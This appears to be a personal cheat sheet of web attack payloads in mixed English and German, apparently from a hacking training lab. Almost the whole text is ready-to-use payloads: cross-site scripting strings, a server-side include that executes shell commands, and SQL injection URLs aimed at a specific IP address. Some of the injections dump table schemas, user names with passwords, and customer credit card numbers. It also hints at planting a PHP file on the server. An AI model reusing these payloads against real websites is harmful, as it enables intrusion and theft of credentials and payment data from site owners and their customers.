# SQL_XSS

XSS
#< script>alert('blabla')< /script>


#SSI -> Server Side Includes
#open a cmd and entre a command on a server using a injiection / for example, to see some directories or files on a server
 <! --#exec cmd="ls ../.." -->  #drop the space

92.60.14.134:8081/xss/iframe3?path=asdfasdf" onload="alert('blabla')

http://92.60.14.134:8081/xss/jsvar1?count=99%22);alert(2);//

http://92.60.14.134:8081/xss/jsvar2?count=33);%3C/script%3E%3Cscript%3Ealert(2)%3C/script%3E

SQL Injection:
105 ' or 1=1 -- -'

http://92.60.14.134:8081/sql/1?category=animal' Union select @@version, null;-- -
http:/bla.ch/bla=1 union all select #find the nummer of tables by test.. example 1,#enter not ok# 1, 2
 from table name
 
 
Alles auszeigen lassen:
http://92.60.14.134:8081/sql/1?category=animal' Union select table_schema, table_name from 

information_schema.tables;-- -

http://92.60.14.134:8081/sql/1?category=animal' Union select table_name, column_name from 

information_schema.columns ;-- -

http://92.60.14.134:8081/sql/1?category=animal' UNION SELECT user_name,user_password FROM users;-- -

Wenn Datenbank im Root verzeichnis lauft, dann kann ein PHP file eingespielt werden.

M* ') or 1=1--
M* ') UNION SELECT 1,2,3,4,5-- -
F* ') union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+ 
F* ') union select 1,name,creditcard,4,5 from customers -- + --> find the credit cards
